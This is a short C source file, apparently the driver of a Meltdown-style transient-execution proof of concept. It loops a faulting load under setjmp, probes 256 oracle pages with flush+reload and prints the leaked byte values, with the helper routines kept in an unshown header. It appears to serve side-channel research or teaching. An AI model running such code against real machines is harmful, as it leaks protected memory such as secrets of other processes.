#include "header.h" 


int main( int argc, char **argv )
{ 
    setup_pages();
    setup_oracle();
    setup_fh();


    while(1){ 
        if(!setjmp(trycatch_buf))
        {
            s_faulty_load();
        }
        
        for (size_t i = 1; i < 256; i++) {
            if (flush_reload((uint8_t *)&oracles + i*PAGE_SIZE)) {
                fprintf(stdout, "%02x ", (uint8_t)i);
                fflush(stdout);
            }
        }
         
    }
    

    return 0;
}


